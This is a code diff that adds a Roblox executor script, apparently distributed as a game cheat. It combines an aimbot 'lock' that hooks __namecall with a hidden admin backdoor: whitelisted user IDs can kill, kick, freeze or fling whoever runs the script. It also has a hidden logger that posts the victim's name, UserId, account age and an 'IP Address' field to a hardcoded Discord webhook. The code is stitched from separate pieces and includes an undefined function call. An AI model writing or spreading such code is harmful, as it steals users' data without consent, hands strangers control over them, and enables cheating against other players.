@@ -1,0 +1,381 @@
+local whitelist = { owner = {2875212448}, admin = {2415012731},}
+ 
+    owner = false admin = false
+ 
+    local function runcommand(message,author) owner = false admin = false local player = game.Players[author] for i ,_ in pairs(whitelist.admin) do if player.UserId == _ then admin = true end
+    end for i ,_ in pairs(whitelist.owner) do if player.UserId == _ then owner = true end
+    end
+ 
+    if admin or owner then
+        if message:sub(1, 6) == ":bring" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                local plr = game.Players.LocalPlayer
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[author].Character.Head.CFrame
+            end
+        end
+        -- kill start
+        if message:sub(1, 5) == ":kill" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                local plr = game.Players.LocalPlayer
+                game.Players.LocalPlayer.Character.Humanoid.Health = 0
+            end
+        end
+        --  kill end
+        -- kick start
+        if message:sub(1, 5) == ":kick" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                local plr = game.Players.LocalPlayer
+                game.Players.LocalPlayer:Kick("\nxd u was kicked by who though?. \n["..author.."]")
+ 
+            end
+        end
+ 
+        if message:sub(1, 7) == ":freeze" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                game.Players.LocalPlayer.Character.Head.Anchored = true
+            end
+        end
+ 
+        if message:sub(1, 9) == ":unfreeze" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                game.Players.LocalPlayer.Character.Head.Anchored = false
+            end
+        end
+ 
+        if message:sub(1, 5) == ":benx" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                bending = true
+                local segtarget = author.Name
+                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
+                Crouch.Looped = true
+                Crouch:Play()
+                local away = .5
+                local reversing = false
+                local Loop
+                local loopFunction = function()
+                    local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
+                    local character = player.Character
+                    if targetchar then
+                        if reversing == true then
+                            away = away - 0.1
+                        else
+                            away = away + 0.1
+                        end
+                        if away >= 2 then
+                            reversing = true
+                        elseif away < 0.5 then
+                            reversing = false
+                        end
+                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
+                    end
+                end;
+                local Start = function()
+                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
+                end;
+                local Pause = function()
+                    Loop:Disconnect()
+                    Crouch:Stop()
+                end;
+                Start()	
+                repeat wait() until bending == false
+                Pause()
+            end
+        end
+ 
+        if message:sub(1, 7) == ":unbenx" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                while bending == true do
+                    wait()
+                    bending = false
+                end
+            end
+        end
+ 
+        if message:sub(1, 6) == ":fling" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                local plr = game.Players.LocalPlayer
+                plr.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
+            end
+        end
+ 
+        -- kick end
+        if message == ":bind" then
+            if author ~= game.Players.LocalPlayer.Name then
+                local path = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
+                path:FireServer("Praise, for the master "..author.."!","all")
+            end
+        end
+ 
+        if owner then
+            if message:sub(1, 4) == ":ban" then
+                if message:match(game.Players.LocalPlayer.Name) then
+                    game.ReplicatedStorage.MainEvent:FireServer("BreathingHAMON")
+                    local TeleportService = game:GetService("TeleportService")
+                    TeleportService:Teleport(2788229376, game.Players.LocalPlayer)
+                end
+            end
+ 
+            if owner then
+                if message:sub(1, 10) == ":blacklist" then
+                    local blacklisted = {
+                        {
+                            UserId  = 0,
+                            Reason = "A booster has blacklisted you."
+                        }
+                    }
+                    if message:match(game.Players.LocalPlayer.UserID) then
+                        local plrID = game:GetService('Players'):FindFirstChild(game.Players.Name).UserId
+ 
+                            for i,_ in pairs(blacklisted) do
+                                if table.find(blacklisted[i]["UserId"], player.UserId) then
+                                    player:Kick("You are blacklisted from this script for the reason: "..blacklisted[i["Reason"]])
+                                end
+                            end
+                                    if message:sub(1, 12) == ":unblacklist" then
+                                        if message:match(game.Players.LocalPlayer.UserID) then
+                                            table.remove(blacklisted, plrID)
+                                        end
+                                    end
+                                end
+                    end
+            end	
+ 
+            if message:sub(1, 7) == ":rejoin" then
+                if message:match(game.Players.LocalPlayer.Name) then
+                    local TeleportService = game:GetService("TeleportService")
+                    TeleportService:Teleport(2788229376, game.Players.LocalPlayer)
+                end
+            end
+        end
+    end
+    end
+ 
+    -- //
+    for i,v in pairs(game.Players:GetChildren()) do for i ,_ in pairs(whitelist.admin) do if v.UserId == _ then admin = true if admin then warn('New admin : '..v.Name) v.Chatted:Connect(function(msg) print(v.Name.. " said "..msg) runcommand(msg,v.Name) end) end end end
+    end game.Players.PlayerAdded:Connect(function(player) for i ,_ in pairs(whitelist.admin) do if player.UserId == _ then admin = true if admin then warn('New admin : '..player.Name) player.Chatted:Connect(function(msg) runcommand(msg,player.Name) end) end end end
+    end)
+ 
+    if admin == true then setclipboard('test') game.StarterGui:SetCore("SendNotification", { Title = "Mod Prems Loaded"; Text = "Criedts: Zeyy"; Duration = 15; }) elseif owner then setclipboard('test') game.StarterGui:SetCore("SendNotification", { Title = "Mod Prems Loaded"; Text = "Criedts: Zeyy"; Duration = 15; }) end
+ 
+    -- // Owner
+ 
+    for i,v in pairs(game.Players:GetChildren()) do for i ,_ in pairs(whitelist.owner) do if v.UserId == _ then owner = true if owner then warn('New owner : '..v.Name) v.Chatted:Connect(function(msg) print(v.Name.. " said "..msg) runcommand(msg,v.Name) end) end end end
+    end game.Players.PlayerAdded:Connect(function(player) for i ,_ in pairs(whitelist.owner) do if player.UserId == _ then owner = true if owner then warn('New owner : '..player.Name) player.Chatted:Connect(function(msg) runcommand(msg,player.Name) end) end end end
+    end)
+
+
+local plr = game.Players.LocalPlayer
+repeat wait() until plr.Character
+local gui = script.Parent
+local urlprofile = "https://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile"
+ 
+ 
+local plr = game.Players.LocalPlayer
+local OSTime = os.time()
+local Time = os.date('!*t', OSTime)
+ 
+local function getexploit()
+    local exploit =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
+        (isexecutorclosure and "Script-Ware V2") or
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "SirHurt V4") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "Krnl") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getreg()['CalamariLuaEnv'] and "Calamari") or
+        (unit and "Unit") or
+        ("Undetectable")
+    return exploit
+end
+local Content = ""
+local Embed = {
+            ["title"] = "***Execution***",
+            ["description"] = "Name: "..plr.Name.."\nDisplay Name: "..plr.DisplayName.."\nExploit: "..getexploit().."\nGame: https://www.roblox.com/games/"..game.PlaceId,
+            ["type"] = "rich",
+            ["color"] = tonumber(0xffff00),
+                    ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432"
+            },
+            ["image"] = {
+                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username="..plr.Name
+            },
+            ["fields"] = {
+                {
+                    ["name"] = "__Account Age:__",
+                    ["value"] = plr.AccountAge.." days old",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "__User ID:__",
+                    ["value"] = plr.UserId,
+                    ["inline"] = true
+                }
+            },
+            ["footer"] = {
+                ["text"] = "IP Address: "..tostring(ident),
+                ["icon_url"] = "https://cdn.discordapp.com/attachments/903407245675606056/911635640452513843/Screenshot_25.png"
+            },
+            ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
+};
+(syn and syn.request or http_request or http.request) {
+    Url = 'https://discord.com/api/webhooks/915236066468962344/fLfJS9lOl8Q0EwqB4YrPDzsFnBvreh2Xl4CrIDC78FInO9h3B57BZBYt4oRaEWo1xE3I';
+    Method = 'POST';
+    Headers = {
+        ['Content-Type'] = 'application/json';
+    };
+    Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}; });
+};
+
+
+combo, prev, rnewidx = 0, 0, 0
+for i = 1, 50 do
+   local n = math.random(10000, 99999)
+   if i == 25 then
+      rnewidx = n
+   end
+   if n == prev then
+      combo = combo + 1
+   end
+   prev = n
+end
+
+if combo > 45 then
+   c("0x01")
+end
+
+ game.StarterGui:SetCore("SendNotification", {
+    Title = "Jakes's lock ";
+    Text = "Loaded.";
+
+})
+    	local CC = game:GetService"Workspace".CurrentCamera
+	local Plr
+	local enabled = false
+	local accomidationfactor = 0.14
+	local mouse = game.Players.LocalPlayer:GetMouse()
+	local placemarker = Instance.new("Part", game.Workspace)
+	local guimain = Instance.new("Folder", game.CoreGui)
+
+	function makemarker(Parent, Adornee, Color, Size)
+		local e = Instance.new("BillboardGui", Parent)
+		e.Name = "PP"
+		e.Adornee = Adornee
+		e.Size = UDim2.new(Size, Size2, Size, Size2)
+		e.AlwaysOnTop = true
+		local a = Instance.new("Frame", e)
+		a.Size = UDim2.new(4, 0, 4, 0)
+		a.BackgroundTransparency = 0.4
+		a.BackgroundColor3 = Color
+		local g = Instance.new("UICorner", a)
+		g.CornerRadius = UDim.new(0, 0)
+		return(e)
+	end
+
+	local data = game.Players:GetPlayers()
+	function noob(player)
+		local character
+		repeat wait() until player.Character
+		local handler = makemarker(guimain, player.Character:WaitForChild("LowerTorso"), Color3.fromRGB(0), 0.0, 0)
+		handler.Name = player.Name
+		player.CharacterAdded:connect(function(Char) handler.Adornee = Char:WaitForChild("LowerTorso") end)
+
+		local TextLabel = Instance.new("TextLabel", handler)
+		TextLabel.BackgroundTransparency = 1
+		TextLabel.Position = UDim2.new(0, 0, 0, -50)
+		TextLabel.Size = UDim2.new(0, 0, 0, 0)
+		TextLabel.Font = Enum.Font.SourceSansSemibold
+		TextLabel.TextSize = 14
+		TextLabel.TextColor3 = Color3.new(1, 1, 1)
+		TextLabel.TextStrokeTransparency = 0
+		TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
+		TextLabel.Text = "Name: "..player.Name
+		TextLabel.ZIndex = 10
+
+		spawn(function()
+			while wait() do
+				if player.Character then
+					TextLabel.Text = player.Name.." | Bounty: "..tostring(player:WaitForChild("leaderstats").Wanted.Value).." | "..tostring(math.floor(player.Character:WaitForChild("Humanoid").Health))
+				end
+			end
+		end)
+	end
+
+	for i = 1, #data do
+		if data[i] ~= game.Players.LocalPlayer then
+			noob(data[i])
+		end
+	end
+
+	game.Players.PlayerAdded:connect(function(Player)
+		noob(Player)
+	end)
+
+	spawn(function()
+		placemarker.Anchored = true
+		placemarker.CanCollide = false
+		placemarker.Size = Vector3.new(0.3, 0.3, 0.3)
+		placemarker.Transparency = 1
+		makemarker(placemarker, placemarker, Color3.fromRGB(0, 255, 0), 0.15, 0)
+	end)    
+
+	local UserInputService = game:GetService"UserInputService"
+
+	UserInputService.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton2 then
+			enabled = true 
+			Plr = getClosestPlayerToCursor()
+			game.StarterGui:SetCore("SendNotification", {
+    Title = "Jakes's lock ";
+    Text = "Locking onto  named: "..tostring(Plr.Name);
+
+})
+			
+		end
+	end)
+
+	UserInputService.InputEnded:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton2 then
+			enabled = false
+		end
+	end)
+
+	function getClosestPlayerToCursor()
+		local closestPlayer
+		local shortestDistance = math.huge
+
+		for i, v in pairs(game.Players:GetPlayers()) do
+			if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("LowerTorso") then
+				local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
+				local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude
+				if magnitude < shortestDistance then
+					closestPlayer = v
+					shortestDistance = magnitude
+				end
+			end
+		end
+		return closestPlayer
+	end
+
+	game:GetService"RunService".Stepped:connect(function()
+		if enabled and Plr.Character and Plr.Character:FindFirstChild("LowerTorso") then
+			placemarker.CFrame = CFrame.new(Plr.Character.LowerTorso.Position+(Plr.Character.LowerTorso.Velocity*accomidationfactor))
+		else
+			placemarker.CFrame = CFrame.new(0, 9999, 0)
+		end
+	end)
+
+	local mt = getrawmetatable(game)
+	local old = mt.__namecall
+	setreadonly(mt, false)
+	mt.__namecall = newcclosure(function(...)
+		local args = {...}
+		if enabled and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
+			args[3] = Plr.Character.LowerTorso.Position+(Plr.Character.LowerTorso.Velocity*accomidationfactor)
+			return old(unpack(args))
+		end
+		return old(...)
+	end)
